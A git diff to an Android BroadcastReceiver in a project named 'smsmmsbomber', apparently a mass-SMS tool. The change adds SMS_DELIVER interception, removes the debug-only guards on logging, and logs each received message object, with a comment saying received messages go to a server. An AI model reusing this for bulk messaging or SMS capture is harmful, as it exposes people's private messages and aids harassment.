@@ -6,14 +6,13 @@ import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
 import android.content.pm.PackageManager;
-import android.util.Log;
 
 import org.apache.commons.lang3.BooleanUtils;
 import org.apache.commons.lang3.StringUtils;
 
-import anthony.com.smsmmsbomber.BuildConfig;
 import anthony.com.smsmmsbomber.model.AnswerBean;
 import anthony.com.smsmmsbomber.model.dao.AnswerDaoManager;
+import anthony.com.smsmmsbomber.utils.LogUtils;
 import anthony.com.smsmmsbomber.utils.SmsMmsManager;
 
 /**
@@ -28,11 +27,12 @@ public class MultipleSendSMSBR extends BroadcastReceiver {
     public static final String SENT_MMS_ACTION_NAME = "MMS_SENT";
     public static final String DELIVERED_SMS_ACTION_NAME = "SMS_DELIVERED";        //Recu
     private static final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
+    private static final String SMS_DELIVER = "android.provider.Telephony.SMS_DELIVER";
 
     @Override
     public void onReceive(Context context, Intent intent) {
 
-        Log.w("TAG_SMS", "MultipleSendSMSBR action=" + intent.getAction());
+        LogUtils.w("TAG_SMS", "MultipleSendSMSBR action=" + intent.getAction());
         AnswerBean answerBean = new AnswerBean();
         //On récupere le sms concerné s'il y en a un
         if (intent.getExtras() != null) {
@@ -42,21 +42,19 @@ public class MultipleSendSMSBR extends BroadcastReceiver {
         //Detect l'envoie de sms
         if (intent.getAction().equals(SENT_SMS_ACTION_NAME) || intent.getAction().equals(ACTION_MMS_SENT) || intent.getAction().equals(SENT_MMS_ACTION_NAME)) {
             answerBean.setSend(getResultCode() == Activity.RESULT_OK);
-            if (BuildConfig.DEBUG) {
-                Log.w("TAG_SMS", getResultCode() == Activity.RESULT_OK ? "SMS envoyé" : "non envoyé");
-            }
+            LogUtils.w("TAG_SMS", getResultCode() == Activity.RESULT_OK ? "SMS envoyé" : "non envoyé");
         }
         //detect l'accuse reception d'un sms
         else if (intent.getAction().equals(DELIVERED_SMS_ACTION_NAME)) {
-            if (BuildConfig.DEBUG) {
-                Log.w("TAG_SMS", getResultCode() == Activity.RESULT_OK ? "SMS recu" : "sms non recu");
-            }
+            LogUtils.w("TAG_SMS", getResultCode() == Activity.RESULT_OK ? "SMS recu" : "sms non recu");
         }
         //on recoit un sms
-        else if (intent.getAction().equals(SMS_RECEIVED)) {
+        else if (intent.getAction().equals(SMS_RECEIVED) || intent.getAction().equals(SMS_DELIVER)) {
             SmsMmsManager.receiveSMS(intent, answerBean);
             //Le message sera envoyé au serveur lors du prochaine tick
         }
+
+        LogUtils.w("TAG_SMS", answerBean.toString());
 
         //S'il est bien relié à un numéro on le sauvegarde
         //POUR LE MOMENT ON NE GARDE PAS LES ACCUSé D'ENVOIE  en success
